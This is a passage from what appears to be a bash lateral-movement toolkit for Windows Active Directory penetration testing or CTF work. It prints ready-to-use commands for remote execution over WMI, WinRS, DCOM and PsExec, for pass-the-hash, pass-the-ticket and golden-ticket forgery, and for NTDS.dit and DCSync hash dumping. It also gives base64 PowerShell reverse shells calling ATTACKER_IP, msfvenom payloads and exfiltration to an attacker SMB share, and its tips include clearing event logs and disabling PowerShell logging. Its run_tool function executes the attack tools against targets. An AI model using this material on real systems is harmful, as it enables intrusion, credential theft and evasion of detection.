    lprint "    ${DIM}# ── Multi-Hop Pivoting ───────────────────────────────────────${NC}"
    print_cmd "  proxychains ${NXC_CMD} smb INTERNAL_SUBNET/24 ${auth_h}    ${DIM}# spray through pivot${NC}"
    print_cmd "  proxychains $(impacket_cmd wmiexec) ${auth_p_next}         ${DIM}# exec through pivot${NC}"
    print_cmd "  proxychains ${WINRM_CMD} -i NEXT_TARGET -u '${user}' -p '${cred}'  ${DIM}# WinRM through pivot${NC}"
    print_cmd "  proxychains ${XFREERDP_CMD} /v:NEXT_TARGET /u:'${user}' /p:'${cred}' ${XFREERDP_CERT}  ${DIM}# RDP through pivot${NC}"

    # ══════════════════════════════════════════════════════════════════════
    # [G] WIN→WIN PIVOT TECHNIQUES — from compromised Windows host
    # ══════════════════════════════════════════════════════════════════════
    lprint "${BOLD}  [${step}] Win→Win Pivot Techniques ${DIM}(from compromised Windows host)${NC}"; ((step++))
    print_note "These run FROM a compromised Windows machine TO another Windows target"
    print_note "Use when you have a shell/RDP on a pivot host and need to move deeper"

    lprint "    ${DIM}# ── G.1) WMI Classic (wmic) ────────────────────────────────────${NC}"
    print_note "Port 135 + high range | Requires: Local Admin on target"
    print_note "Process runs in Session 0 (invisible to logged-in user)"
    print_cmd "wmic /node:NEXT_TARGET /user:${dom_prefix}${user} /password:${cred} process call create \"cmd /c whoami > C:\\\\Temp\\\\out.txt\"  ${DIM}# exec + capture output${NC}"
    print_cmd "wmic /node:NEXT_TARGET /user:${dom_prefix}${user} /password:${cred} process call create \"powershell -enc B64_PAYLOAD\"  ${DIM}# reverse shell${NC}"
    print_note "ReturnValue=0 means success | Read output: type \\\\NEXT_TARGET\\C\$\\Temp\\out.txt"

    lprint "    ${DIM}# ── G.2) PowerShell CimSession (WMI via PS) ─────────────────────${NC}"
    print_note "Modern replacement for wmic — uses DCOM protocol over port 135"
    print_cmd "\$cred = New-Object PSCredential('${dom_prefix}${user}',(ConvertTo-SecureString '${cred}' -AsPlaintext -Force))"
    print_cmd "\$opt = New-CimSessionOption -Protocol DCOM"
    print_cmd "\$sess = New-CimSession -ComputerName NEXT_TARGET -Credential \$cred -SessionOption \$opt"
    print_cmd "Invoke-CimMethod -CimSession \$sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -enc B64_PAYLOAD'}  ${DIM}# exec on target${NC}"

    lprint "    ${DIM}# ── G.3) WinRS (Windows Remote Shell) ──────────────────────────${NC}"
    print_note "Port 5985/5986 | Uses WinRM but via native Windows command"
    print_cmd "winrs -r:NEXT_TARGET -u:${dom_prefix}${user} -p:${cred} \"cmd /c hostname & whoami\"  ${DIM}# quick check${NC}"
    print_cmd "winrs -r:NEXT_TARGET -u:${dom_prefix}${user} -p:${cred} \"cmd /c type C:\\Users\\Administrator\\Desktop\\flag.txt\"  ${DIM}# read flag${NC}"
    print_cmd "winrs -r:NEXT_TARGET -u:${dom_prefix}${user} -p:${cred} \"powershell -enc B64_PAYLOAD\"  ${DIM}# reverse shell${NC}"
    print_note "Works with hostname or IP | Domain user must be in Remote Management Users or Administrators"

    lprint "    ${DIM}# ── G.4) PowerShell Remoting (PSSession) ───────────────────────${NC}"
    print_note "Port 5985/5986 | Interactive PowerShell session on remote host"
    print_cmd "\$cred = New-Object PSCredential('${dom_prefix}${user}',(ConvertTo-SecureString '${cred}' -AsPlaintext -Force))"
    print_cmd "\$s = New-PSSession -ComputerName NEXT_TARGET -Credential \$cred  ${DIM}# create session${NC}"
    print_cmd "Enter-PSSession \$s  ${DIM}# interactive PS shell on target${NC}"
    print_cmd "Invoke-Command -Session \$s -ScriptBlock { whoami; hostname; ipconfig }  ${DIM}# run commands${NC}"
    print_cmd "Invoke-Command -ComputerName HOST1,HOST2,HOST3 -Credential \$cred -ScriptBlock { hostname }  ${DIM}# fan-out to multiple hosts${NC}"
    print_cmd "Copy-Item -Path C:\\Temp\\payload.exe -Destination C:\\Temp\\payload.exe -ToSession \$s  ${DIM}# upload file through PS session${NC}"
    print_cmd "Copy-Item -Path C:\\Users\\Administrator\\Desktop\\flag.txt -Destination C:\\Temp\\flag.txt -FromSession \$s  ${DIM}# download file${NC}"
    print_note "PS remoting keeps a persistent interactive session — better than one-shot exec"

    lprint "    ${DIM}# ── G.5) Sysinternals PsExec64 (Windows native) ────────────────${NC}"
    print_note "Port 445 | Requires: ADMIN\$ share accessible + Local Admin"
    print_note "Uploads psexesvc.exe to target — NOISY but reliable"
    print_cmd ".\\PsExec64.exe \\\\NEXT_TARGET -u ${dom_prefix}${user} -p ${cred} cmd  ${DIM}# interactive CMD shell${NC}"
    print_cmd ".\\PsExec64.exe \\\\NEXT_TARGET -u ${dom_prefix}${user} -p ${cred} -s cmd  ${DIM}# SYSTEM shell (-s flag)${NC}"
    print_cmd ".\\PsExec64.exe \\\\NEXT_TARGET -u ${dom_prefix}${user} -p ${cred} -c C:\\Temp\\payload.exe  ${DIM}# copy + execute payload${NC}"
    print_note "IMPORTANT: Use HOSTNAME not IP when using Kerberos tickets (IP forces NTLM)"

    lprint "    ${DIM}# ── G.6) DCOM via PowerShell (MMC20.Application) ──────────────${NC}"
    print_note "Port 135 | Requires: Local Admin | Uses COM object remotely"
    print_note "Stealthier than PsExec — no binary upload, no service creation"
    print_cmd "\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','NEXT_TARGET'))"
    print_cmd "\$dcom.Document.ActiveView.ExecuteShellCommand('cmd',\$null,'/c whoami > C:\\Temp\\out.txt','7')  ${DIM}# test exec${NC}"
    print_cmd "\$dcom.Document.ActiveView.ExecuteShellCommand('powershell',\$null,'-enc B64_PAYLOAD','7')  ${DIM}# reverse shell${NC}"
    print_note "Process runs in Session 0 (invisible) | Also try ShellWindows, ShellBrowserWindow COM objects"

    # ══════════════════════════════════════════════════════════════════════
    # [H] OVERPASS-THE-HASH (NTLM Hash → Kerberos TGT)
    # ══════════════════════════════════════════════════════════════════════
    lprint "${BOLD}  [${step}] Overpass-the-Hash ${DIM}(NTLM → Kerberos TGT)${NC}"; ((step++))
    print_note "Convert NTLM hash to Kerberos ticket — bypasses NTLM-only restrictions"
    print_note "Use when: target requires Kerberos auth, or NTLM is blocked/monitored"

    lprint "    ${DIM}# ── H.1) Mimikatz sekurlsa::pth (from compromised Windows) ────${NC}"
    print_note "Spawns a NEW process running as the target user's token"
    print_cmd "mimikatz # privilege::debug"
    print_cmd "mimikatz # sekurlsa::pth /user:${user} /domain:${domain:-DOMAIN} /ntlm:${hash_val:-NTLM_HASH} /run:powershell"
    print_note "New PS window opens with target user's token"
    print_note "IMPORTANT: 'whoami' still shows YOUR user — that's expected (token-level impersonation)"

    lprint "    ${DIM}# ── H.2) Force TGT Generation ──────────────────────────────────${NC}"
    print_note "In the NEW PowerShell window from sekurlsa::pth:"
    print_cmd "klist  ${DIM}# should show 0 tickets initially${NC}"
    print_cmd "net use \\\\NEXT_TARGET  ${DIM}# forces Kerberos auth → caches TGT${NC}"
    print_cmd "klist  ${DIM}# now shows TGT (krbtgt) + TGS (cifs/host)${NC}"
    print_note "The 'net use' triggers Kerberos authentication and caches the ticket"

    lprint "    ${DIM}# ── H.3) Use Cached TGT with PsExec ───────────────────────────${NC}"
    print_cmd ".\\PsExec.exe \\\\NEXT_TARGET cmd  ${DIM}# uses cached Kerberos ticket${NC}"
    print_note "CRITICAL: Use HOSTNAME not IP! IP = NTLM auth (ticket won't work)"
    print_note "Hostname = Kerberos auth (uses the ticket you just cached)"

    lprint "    ${DIM}# ── H.4) Impacket Overpass-the-Hash (from Kali) ────────────────${NC}"
    if [[ "$use_hash" == "1" ]]; then
        print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}' -hashes :${hash_val} -dc-ip ${ip}  ${DIM}# hash → TGT${NC}"
    else
        print_note "Need NTLM hash first — dump with secretsdump or mimikatz"
        print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}' -hashes :NTLM_HASH -dc-ip ${ip}  ${DIM}# hash → TGT${NC}"
    fi
    print_cmd "export KRB5CCNAME=${user}.ccache  ${DIM}# load ticket${NC}"
    print_cmd "$(impacket_cmd psexec) -k -no-pass '${dom_prefix}${user}'@NEXT_TARGET.${domain:-DOMAIN}  ${DIM}# PtT shell${NC}"
    print_cmd "$(impacket_cmd wmiexec) -k -no-pass '${dom_prefix}${user}'@NEXT_TARGET.${domain:-DOMAIN}  ${DIM}# WMI shell${NC}"
    print_note "Kerberos from Kali requires: target hostname in /etc/hosts + /etc/krb5.conf realm config"

    # ══════════════════════════════════════════════════════════════════════
    # [I] PASS-THE-TICKET (Steal + Inject Kerberos Tickets)
    # ══════════════════════════════════════════════════════════════════════
    lprint "${BOLD}  [${step}] Pass-the-Ticket ${DIM}(steal + inject Kerberos tickets)${NC}"; ((step++))
    print_note "Export tickets from another user's session → inject into yours → access their resources"
    print_note "TGT = krbtgt (access everything) | TGS = cifs/service (access specific service)"

    lprint "    ${DIM}# ── I.1) Mimikatz — Export All Tickets ─────────────────────────${NC}"
    print_cmd "mimikatz # privilege::debug"
    print_cmd "mimikatz # sekurlsa::tickets /export  ${DIM}# exports .kirbi files to current directory${NC}"
    print_cmd "dir *.kirbi  ${DIM}# find the ticket you want (look for cifs-TARGETHOST.kirbi)${NC}"
    print_note "TGT files contain 'krbtgt' in filename | TGS files contain service name (cifs, http, etc.)"

    lprint "    ${DIM}# ── I.2) Mimikatz — Inject Ticket ──────────────────────────────${NC}"
    print_cmd "mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-user@cifs-TARGET.kirbi  ${DIM}# inject the .kirbi ticket${NC}"
    print_note "Replace filename with actual .kirbi file from 'dir *.kirbi'"
    print_note "No error output = success"

    lprint "    ${DIM}# ── I.3) Verify + Use Injected Ticket ─────────────────────────${NC}"
    print_cmd "klist  ${DIM}# verify ticket is loaded (shows target user @ domain)${NC}"
    print_cmd "dir \\\\NEXT_TARGET\\C\$  ${DIM}# access target as ticket owner${NC}"
    print_cmd ".\\PsExec.exe \\\\NEXT_TARGET cmd  ${DIM}# shell as ticket owner${NC}"
    print_note "You now act as the ticket owner — access their shares, services, etc."

    lprint "    ${DIM}# ── I.4) Rubeus (modern alternative to Mimikatz) ────────────────${NC}"
    print_note "Rubeus = C# Kerberos manipulation tool | More features, better output"
    print_cmd ".\\Rubeus.exe dump /nowrap  ${DIM}# dump all tickets (base64 format)${NC}"
    print_cmd ".\\Rubeus.exe ptt /ticket:<BASE64_TICKET>  ${DIM}# inject base64 ticket${NC}"
    print_cmd ".\\Rubeus.exe klist  ${DIM}# verify loaded tickets${NC}"
    print_cmd ".\\Rubeus.exe asktgs /ticket:<TGT_BASE64> /service:cifs/NEXT_TARGET.${domain:-DOMAIN} /ptt  ${DIM}# request + inject TGS${NC}"
    print_cmd ".\\Rubeus.exe tgtdeleg /target:cifs/NEXT_TARGET.${domain:-DOMAIN}  ${DIM}# extract usable TGT via delegation trick${NC}"
    print_cmd ".\\Rubeus.exe s4u /ticket:<TGT_B64> /impersonateuser:Administrator /msdsspn:cifs/NEXT_TARGET.${domain:-DOMAIN} /ptt  ${DIM}# S4U impersonation${NC}"

    lprint "    ${DIM}# ── I.5) Impacket — Convert + Use Tickets (Kali) ───────────────${NC}"
    print_cmd "$(impacket_cmd ticketConverter) ticket.kirbi ticket.ccache  ${DIM}# .kirbi → .ccache (Windows → Linux)${NC}"
    print_cmd "$(impacket_cmd ticketConverter) ticket.ccache ticket.kirbi  ${DIM}# .ccache → .kirbi (Linux → Windows)${NC}"
    print_cmd "export KRB5CCNAME=ticket.ccache"
    print_cmd "$(impacket_cmd psexec) -k -no-pass NEXT_TARGET.${domain:-DOMAIN}  ${DIM}# use ticket from Kali${NC}"

    # ══════════════════════════════════════════════════════════════════════
    # [J] GOLDEN TICKET (Persistence — forge any TGT)
    # ══════════════════════════════════════════════════════════════════════
    if [[ "$is_admin" == "true" || "$is_da" == "true" ]]; then
        lprint "${BOLD}  [${step}] Golden Ticket ${BRED}(Persistence — forge any TGT)${NC}"; ((step++))
        print_note "Forge a TGT using krbtgt hash → access ENTIRE domain as any user"
        print_note "Requires: krbtgt NTLM hash + Domain SID (need DA access to DC to get these)"
        print_note "CRITICAL: This is persistence — document and get explicit permission in engagements"

        lprint "    ${DIM}# ── J.1) Dump krbtgt Hash (need DA on DC) ───────────────────${NC}"
        print_cmd "mimikatz # privilege::debug"
        print_cmd "mimikatz # lsadump::lsa /patch  ${DIM}# look for 'krbtgt' entry (RID 502)${NC}"
        print_cmd "mimikatz # lsadump::dcsync /user:krbtgt  ${DIM}# DCSync (no need to run on DC)${NC}"
        print_cmd "$(impacket_cmd secretsdump) ${auth_p} -just-dc-user krbtgt  ${DIM}# from Kali${NC}"

        lprint "    ${DIM}# ── J.2) Get Domain SID ─────────────────────────────────────${NC}"
        print_cmd "whoami /user  ${DIM}# SID format: S-1-5-21-XXXX-XXXX-XXXX-RID → drop the last part${NC}"
        print_cmd "Get-ADDomain | Select DomainSID  ${DIM}# PowerShell (if RSAT available)${NC}"
        print_cmd "$(impacket_cmd lookupsid) ${auth_p}  ${DIM}# from Kali${NC}"

        lprint "    ${DIM}# ── J.3) Mimikatz — Forge + Inject Golden Ticket ────────────${NC}"
        print_note "Can run on ANY machine — even non-domain-joined!"
        print_cmd "mimikatz # kerberos::purge  ${DIM}# clear existing tickets first${NC}"
        print_cmd "mimikatz # kerberos::golden /user:Administrator /domain:${domain:-DOMAIN} /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt  ${DIM}# forge + inject${NC}"
        print_cmd "mimikatz # misc::cmd  ${DIM}# open CMD with golden ticket loaded${NC}"
        print_note "/ptt = inject directly into memory | Default groups: DA, EA, Schema Admins"

        lprint "    ${DIM}# ── J.4) Use Golden Ticket ──────────────────────────────────${NC}"
        print_cmd ".\\PsExec.exe \\\\DC1 cmd  ${DIM}# SYSTEM shell on DC${NC}"
        print_cmd "dir \\\\DC1\\C\$  ${DIM}# browse DC filesystem${NC}"
        print_note "CRITICAL: Use HOSTNAME not IP! IP = NTLM auth = ticket ignored"
        print_note "Hostname = Kerberos auth = golden ticket works"

        lprint "    ${DIM}# ── J.5) Impacket Golden Ticket (from Kali) ─────────────────${NC}"
        print_cmd "$(impacket_cmd ticketer) -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain ${domain:-DOMAIN} Administrator  ${DIM}# forge ticket${NC}"
        print_cmd "export KRB5CCNAME=Administrator.ccache"
        print_cmd "$(impacket_cmd psexec) -k -no-pass ${domain:-DOMAIN}/Administrator@DC1.${domain:-DOMAIN}  ${DIM}# SYSTEM shell on DC${NC}"
        print_cmd "$(impacket_cmd secretsdump) -k -no-pass ${domain:-DOMAIN}/Administrator@DC1.${domain:-DOMAIN}  ${DIM}# dump all hashes${NC}"
    fi

    # ══════════════════════════════════════════════════════════════════════
    # [K] SHADOW COPY — NTDS.dit Full Extraction
    # ══════════════════════════════════════════════════════════════════════
    if [[ "$is_admin" == "true" || "$is_da" == "true" ]]; then
        lprint "${BOLD}  [${step}] Shadow Copy ${DIM}(NTDS.dit extraction — ALL domain hashes)${NC}"; ((step++))
        print_note "Extract NTDS.dit via Volume Shadow Service → dump every domain hash"
        print_note "Requires: Domain Admin on DC | Alternative: DCSync (no files on disk)"

        lprint "    ${DIM}# ── K.1) Create Shadow Copy on DC ──────────────────────────${NC}"
        print_cmd "vssadmin create shadow /for=C:  ${DIM}# create shadow copy${NC}"
        print_note "Note the 'Shadow Copy Volume Name' from output (e.g. \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2)"

        lprint "    ${DIM}# ── K.2) Extract NTDS.dit + SYSTEM Hive ────────────────────${NC}"
        print_cmd "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit.bak"
        print_cmd "reg save HKLM\\SYSTEM C:\\Temp\\system.bak"
        print_note "Replace 'ShadowCopyX' with actual number from vssadmin output"

        lprint "    ${DIM}# ── K.3) Transfer Files to Kali ────────────────────────────${NC}"
        print_cmd "$(impacket_cmd smbserver) share . -smb2support  ${DIM}# start SMB server on Kali${NC}"
        print_cmd "copy C:\\Temp\\ntds.dit.bak \\\\ATTACKER_IP\\share\\  ${DIM}# from DC${NC}"
        print_cmd "copy C:\\Temp\\system.bak \\\\ATTACKER_IP\\share\\  ${DIM}# from DC${NC}"

        lprint "    ${DIM}# ── K.4) Offline Extraction (Kali) ─────────────────────────${NC}"
        print_cmd "$(impacket_cmd secretsdump) -ntds ntds.dit.bak -system system.bak LOCAL  ${DIM}# dump ALL accounts${NC}"
        print_note "Output format: username:RID:LMhash:NThash::: → use NT hash for PTH"

        lprint "    ${DIM}# ── K.5) DCSync — Network-Based (no files on disk) ─────────${NC}"
        print_note "Faster, stealthier — replicates AD data over the network"
        print_cmd "mimikatz # lsadump::dcsync /domain:${domain:-DOMAIN} /all /csv  ${DIM}# all hashes${NC}"
        print_cmd "mimikatz # lsadump::dcsync /user:Administrator  ${DIM}# single user${NC}"
        print_cmd "mimikatz # lsadump::dcsync /user:krbtgt  ${DIM}# krbtgt for golden ticket${NC}"
        print_cmd "$(impacket_cmd secretsdump) ${auth_p}  ${DIM}# DCSync from Kali${NC}"
        print_cmd "$(impacket_cmd secretsdump) ${auth_p} -just-dc-ntlm  ${DIM}# NT hashes only (fast)${NC}"
    fi

    # ══════════════════════════════════════════════════════════════════════
    # [L] REVERSE SHELL GENERATION — for lateral movement payloads
    # ══════════════════════════════════════════════════════════════════════
    lprint "${BOLD}  [${step}] Reverse Shell Generation ${DIM}(for lateral movement payloads)${NC}"; ((step++))
    print_note "Many lateral movement techniques need a reverse shell payload"
    print_note "Use B64-encoded PowerShell for WMI/DCOM/WinRS/atexec execution"

    lprint "    ${DIM}# ── L.1) PowerShell Base64 Reverse Shell ───────────────────────${NC}"
    print_note "Encode on Kali, execute on target — avoids special character issues"
    print_cmd "python3 -c \"import base64; payload='\\\$c=New-Object Net.Sockets.TCPClient(\\\"ATTACKER_IP\\\",LPORT);\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length)) -ne 0){iex ([Text.Encoding]::ASCII.GetString(\\\$b,0,\\\$i))}'; print(base64.b64encode(payload.encode('utf-16-le')).decode())\"  ${DIM}# generate B64${NC}"
    print_cmd "powershell -nop -w hidden -e <BASE64_OUTPUT>  ${DIM}# this is what you pass to WMI/DCOM/WinRS${NC}"

    lprint "    ${DIM}# ── L.2) Raw PowerShell One-Liner ──────────────────────────────${NC}"
    print_cmd "powershell -nop -c \"\\\$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',LPORT);\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length)) -ne 0){iex ([Text.Encoding]::ASCII.GetString(\\\$b,0,\\\$i))}\""

    lprint "    ${DIM}# ── L.3) msfvenom Payloads ─────────────────────────────────────${NC}"
    print_cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f exe -o shell.exe  ${DIM}# standalone EXE${NC}"
    print_cmd "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f exe -o met.exe  ${DIM}# meterpreter${NC}"
    print_cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f ps1 -o shell.ps1  ${DIM}# PowerShell format${NC}"

    lprint "    ${DIM}# ── L.4) Listener Setup ────────────────────────────────────────${NC}"
    print_cmd "nc -lnvp LPORT  ${DIM}# netcat listener (for raw PS reverse shell)${NC}"
    print_cmd "rlwrap nc -lnvp LPORT  ${DIM}# with readline (arrow keys work)${NC}"
    print_cmd "msfconsole -q -x 'use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT LPORT; run'  ${DIM}# meterpreter handler${NC}"

    # ══════════════════════════════════════════════════════════════════════
    # [M] HASH CRACKING QUICK REFERENCE
    # ══════════════════════════════════════════════════════════════════════
    lprint "${BOLD}  [${step}] Hash Cracking Reference ${DIM}(crack dumped hashes)${NC}"; ((step++))
    print_note "After dumping hashes from SAM/NTDS/LSASS/Kerberoast, crack them for more access"

    lprint "    ${DIM}# ── M.1) NTLM (from SAM dump, secretsdump, mimikatz) ──────────${NC}"
    print_cmd "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  ${DIM}# basic dictionary${NC}"
    print_cmd "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule  ${DIM}# with rules${NC}"
    print_cmd "john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  ${DIM}# john alternative${NC}"

    lprint "    ${DIM}# ── M.2) NetNTLMv2 (from Responder/relay capture) ──────────────${NC}"
    print_cmd "hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt"

    lprint "    ${DIM}# ── M.3) Kerberoast TGS (from GetUserSPNs/kerberoasting) ──────${NC}"
    print_cmd "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# RC4-HMAC (most common)${NC}"
    print_cmd "hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# AES-128${NC}"
    print_cmd "hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# AES-256${NC}"

    lprint "    ${DIM}# ── M.4) AS-REP Roast (from GetNPUsers) ────────────────────────${NC}"
    print_cmd "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"

    lprint "    ${DIM}# ── M.5) Identify Hash Type ────────────────────────────────────${NC}"
    print_cmd "hashid '<HASH_STRING>'  ${DIM}# auto-detect hash type${NC}"
    print_cmd "haiti '<HASH_STRING>'   ${DIM}# alternative identifier${NC}"
    print_cmd "nth -f hashes.txt       ${DIM}# Name-That-Hash (batch mode)${NC}"

    # ── OPSEC ─────────────────────────────────────────────────────────────
    lprint "${BOLD}  [!] OPSEC Reminders${NC}"
    print_note "ALWAYS clean up after your engagement — remove tools, logs, and disable services you enabled"
    print_tip "Check lockout FIRST: ${NXC_CMD} smb ${ip} ${auth_h} --pass-pol"
    print_tip "Check AV before uploads: ${NXC_CMD} smb ${ip} ${auth_h} -M enum_av"
    print_tip "HOSTNAME vs IP: Use HOSTNAME for Kerberos auth (tickets), IP for NTLM auth (hashes)"
    print_tip "Remove services/tasks: sc delete <ServiceName> | schtasks /delete /tn <TaskName> /f"
    print_tip "Clear event logs: wevtutil cl System && wevtutil cl Security && wevtutil cl Application"
    print_tip "Clean temp files: del /f /q C:\\Windows\\Temp\\*.exe C:\\Temp\\*.bak"
    print_tip "Disable PowerShell logging (if you enabled it): Set-ItemProperty -Path ... -Name EnableScriptBlockLogging -Value 0"
    [[ "$tool" == "mssql" ]] && print_tip "${BRED}CRITICAL: exec sp_configure 'xp_cmdshell',0; RECONFIGURE${NC}"

    lprint "${BOLD}${CYAN}╚══════════════════════════════════════════════════════════════════╝${NC}"
    lprint ""
}
# ═══════════════════════════════════════════════════════════════════════════
# TOOL EXECUTION
# ═══════════════════════════════════════════════════════════════════════════
run_tool() {
    local tool="$1" user="$2" ip="$3" cred="$4" use_hash="$5" command="$6" domain="${7:-}"

    [[ "$tool" == "ssh" && "$use_hash" == "1" ]] && {
        lprint "  ${DIM}[${tool}] Skipping — SSH does not support pass-the-hash${NC}"
        return 3; }

    local cmd
    cmd=$(build_cmd "$tool" "$user" "$ip" "$cred" "$use_hash" "$command" "$domain") || {
        print_fail "  Failed to build command for ${tool}"; return 1; }

    local timeout_val="$EXEC_TIMEOUT"
    [[ "$tool" =~ ^winrm ]] && timeout_val="$WINRM_TIMEOUT"
    [[ "$tool" == "rdp" ]]   && timeout_val="$RDP_TIMEOUT"
    [[ "$tool" == "mssql" ]] && print_info "  ${YELLOW}Enabling xp_cmdshell on ${ip}...${NC}"

    lprint ""
    lprint "${INFO} ${BOLD}[${tool}]${NC} → ${CYAN}${ip}${NC} | ${YELLOW}${user}${NC}"
    lprint "    ${DIM}$ ${cmd}${NC}"

    local out rc=0
    out=$(timeout "$timeout_val" bash -c "$cmd" 2>&1) || rc=$?

    # Stream output
    if [[ -n "$out" ]]; then
        lprint "${DIM}  ┌─ Output ──────────────────────────────────────────────────────${NC}"
        while IFS= read -r line; do
            local c="$line"
            c="${c//\[+\]/$'\033[1;32m[+]\033[0m'}"
            c="${c//\[-\]/$'\033[1;31m[-]\033[0m'}"
            c="${c//Pwn3d!/$'\033[1;31mPwn3d!\033[0m'}"
            lprint "  ${DIM}│${NC} ${c}"
        done <<< "$out"
        lprint "${DIM}  └───────────────────────────────────────────────────────────────${NC}"
    fi

    # Parse output for privilege context
    analyze_output "$out" "$ip" "$user"

    # Timeout
    if [[ $rc -eq 124 ]]; then
        print_warn "  ${tool} timed out (${timeout_val}s)"
        [[ "$tool" =~ ^winrm ]] && print_tip "Increase timeout: --winrm-timeout 60"
        analyze_error "$tool" "timed out Connection refused" "$ip" "$user" "$cred" "$use_hash"
        return 2
    fi

    # ── Per-tool success detection ─────────────────────────────────────────
    case "$tool" in
        psexec)
            echo "$out" | grep -q "Found writable share" || {
                print_fail "  psexec: no writable shares or auth failed"
                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
                return 1; }
            echo "$out" | grep -q "Stopping service" && return 0
            print_warn "  psexec: auth OK but AV blocked binary drop"
            print_tip "Use fileless: --tools atexec,wmi"
            return 1 ;;

        winrm|winrm-ssl)
            echo "$out" | grep -qi "WinRMAuthorizationError\|Unauthorized\|BadStatus\|ECONNREFUSED\|refused" && {
                print_fail "  ${tool} auth failed"
                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
                return 1; }
            # rc=0 = success; rc=1 + NoMethodError = success (evil-winrm exit quirk)
            if [[ $rc -eq 0 ]] || { [[ $rc -eq 1 ]] && echo "$out" | grep -q "NoMethodError"; }; then
                return 0; fi
            print_fail "  ${tool} failed (rc=${rc})"
            analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
            return 1 ;;

        rdp)
            # "[-] Clipboard" = auth WORKS but clipboard init failed → auth-only
            if echo "$out" | grep -qi "Clipboard\|clipboard.*failed\|screentime"; then
                if echo "$out" | grep -qi "\[+\]"; then
                    lprint "  ${AUTH} ${YELLOW}RDP AUTH confirmed on ${ip} as ${user}${NC}"
                    print_warn "  Screenshot/cmd init failed (expected for many configs)"
                    local rdp_pass_arg; [[ "$use_hash" == "1" ]] && rdp_pass_arg="/pth:${hash_val}" || rdp_pass_arg="/p:'${cred}'"
                    print_tip "Connect with: xfreerdp /v:${ip} /u:'${user}' ${rdp_pass_arg} /cert-ignore /dynamic-resolution +clipboard"
                    record_auth_only "$ip" "rdp" "$user" "$cred"
                    # Mark port as open for next_steps
                    echo "3389" >> "${TMP_DIR}/ports_${ip//./_}.txt" 2>/dev/null || true
                else
                    print_fail "  rdp auth failed on ${ip}"
                    analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
                fi
                return 1
            fi
            echo "$out" | grep -q "unrecognized arguments" && {
                print_warn "  RDP: netexec version doesn't support screenshot. Upgrade netexec."
                # Fallback: try plain auth check
                local plain_cmd="${NXC_CMD} rdp ${ip} -u '${user}'"
                [[ "$use_hash" == "1" ]] && plain_cmd+=" -H ${hash_val}" || plain_cmd+=" -p '${cred}'"
                local plain_out; plain_out=$(timeout 20 bash -c "$plain_cmd" 2>&1)
                echo "$plain_out" | grep -q "\[+\]" && {
                    print_auth "  RDP AUTH confirmed (legacy nxc)"
                    record_auth_only "$ip" "rdp" "$user" "$cred"
                }
                return 1; }
            # Screenshot success: has [+] no [-]
            if echo "$out" | grep -q "\[+\]" && ! echo "$out" | grep -q "\[-\]"; then
                return 0; fi
            echo "$out" | grep -q "\[-\]" && {
                print_fail "  rdp failed"
                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
                return 1; }
            [[ -n "$out" ]] && return 0 || return 1 ;;

        smbexec|atexec)
            if echo "$out" | grep -q "\[-\]"; then
                if echo "$out" | grep -q "\[+\]"; then
                    print_auth "  ${tool}: CREDS VALID as ${user} on ${ip} — not local admin (no exec)"
                    record_auth_only "$ip" "$tool" "$user" "$cred"
                elif echo "$out" | grep -q "Could not retrieve"; then
                    print_warn "  ${tool}: AUTH OK, exec failed (AV/EDR likely blocking)"
                    print_tip "Try --tools atexec,wmi for fileless execution"
                else
                    print_fail "  ${tool} failed"
                    analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
                fi
                return 1
            fi
            echo "$out" | grep -q "Pwn3d!" && return 0
            echo "$out" | grep -q "\[+\]" && ! echo "$out" | grep -qi "Executed" && {
                print_auth "  ${tool}: AUTH OK as ${user} on ${ip} — not local admin"
                record_auth_only "$ip" "$tool" "$user" "$cred"
                return 1; }
            [[ $rc -eq 0 && -z "$out" ]] && { print_fail "  ${tool} failed silently"; return 1; }
            return 0 ;;

        wmi)
            if echo "$out" | grep -q "\[-\]"; then
                if echo "$out" | grep -q "\[+\]"; then
                    print_auth "  wmi: CREDS VALID as ${user} on ${ip} — not local admin"
                    record_auth_only "$ip" "$tool" "$user" "$cred"
                else
                    print_fail "  wmi failed"
                    analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
                fi
                return 1
            fi
            # NXC WMI success: [+] without [-], and/or "Executed"
            if echo "$out" | grep -q "\[+\]"; then
                echo "$out" | grep -qi "Executed" && return 0
                echo "$out" | grep -q "Pwn3d!" && return 0
